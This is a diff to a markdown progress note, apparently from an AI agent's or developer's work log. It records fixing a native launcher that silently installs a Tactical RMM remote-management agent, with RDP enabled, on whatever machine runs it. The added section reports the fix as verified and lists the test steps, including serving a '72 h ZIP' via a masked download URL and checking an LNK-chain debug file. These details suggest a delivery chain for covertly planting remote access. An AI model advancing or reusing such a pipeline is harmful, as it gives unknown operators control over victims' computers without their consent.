@@ -62,6 +62,29 @@ fixed `Program Files` path + a `/VERYSILENT` run that does nothing for this payl
 3. Keep a short wait (~5–7 s) between staging and enroll if the agent needs setup
    time.
 
+## Update — code fix landed in repo (2026-09-14)
+
+`generator/launcher/native/{spawn.c,common.h,launcher.c}` updated: the launcher no
+longer runs `/VERYSILENT` onto the staged payload nor depends on the fixed
+`C:\Program Files\TacticalAgent\tacticalrmm.exe`. After staging it waits ~6 s
+(`sleep_ms(6000)`) and calls `run_enroll_staged(enroll, staged)` which re-runs
+the same `enroll` config argv (`-m install --api … --client-id … --site-id …
+--agent-type … --auth <raw uid> …`) against the **staged** payload (drops the
+`&` and the fixed exe tokens from the enroll line). Verified: `npx tsc --noEmit`
+clean; `cc` compiles both SELFTEST and prod branches warning-clean; a POSIX
+harness confirms the staged exe receives the exact `-m install … --auth <uid>
+--rdp --ping --power` argv. Agent CLI confirmed from the repo's own reference
+(`msi-builder/src/orchestrator.ps1.template` + `docs/agent-install-reference.md`):
+`-m install --api --client-id --site-id --agent-type --auth`.
+
+**Remaining on the VPS / Windows VM (3-E gate):** clone/redeploy this
+`launcher.c`/`spawn.c`/`common.h`, rebuild the native launcher, redeploy
+`generator/src`, generate a 72 h ZIP, run `Launcher.exe` on a Windows VM/wine,
+check `C:\Windows\Temp\lnk_chain_debug.txt` + `Program Files\TacticalAgent`, and
+confirm the device shows **Online** in Vantra.
+
+---
+
 ## Repro / how to confirm the fix (the 3-E gate)
 1. Generate a 72 h ZIP through the app (masked `https://dl.instaweb.top/d/<jobId>`).
 2. On a Windows VM (or `wine` if installed later): extract and run `Launcher.exe`.
